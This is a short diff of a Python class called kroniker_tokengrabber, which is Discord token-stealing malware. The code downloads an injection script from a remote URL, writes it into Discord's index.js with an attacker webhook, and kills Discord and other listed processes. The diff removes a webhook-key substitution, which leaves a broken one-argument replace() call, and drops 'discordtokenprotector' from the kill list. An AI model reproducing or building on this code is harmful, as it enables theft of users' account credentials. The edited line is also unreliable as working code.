@@ -203,7 +203,7 @@ class kroniker_tokengrabber(functions):
                             if "api/webhooks" in self.webhook:
                                 f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                             else:
-                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%", self.fetchConf('webhook_protector_key'))
+                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%")
                             try:
                                 with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                     indexFile.write(f)
@@ -214,7 +214,7 @@ class kroniker_tokengrabber(functions):
 
     async def killProcesses(self):
         blackListedPrograms = self.fetchConf('blackListedPrograms')
-        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
+        for i in ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']:
             blackListedPrograms.append(i)
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
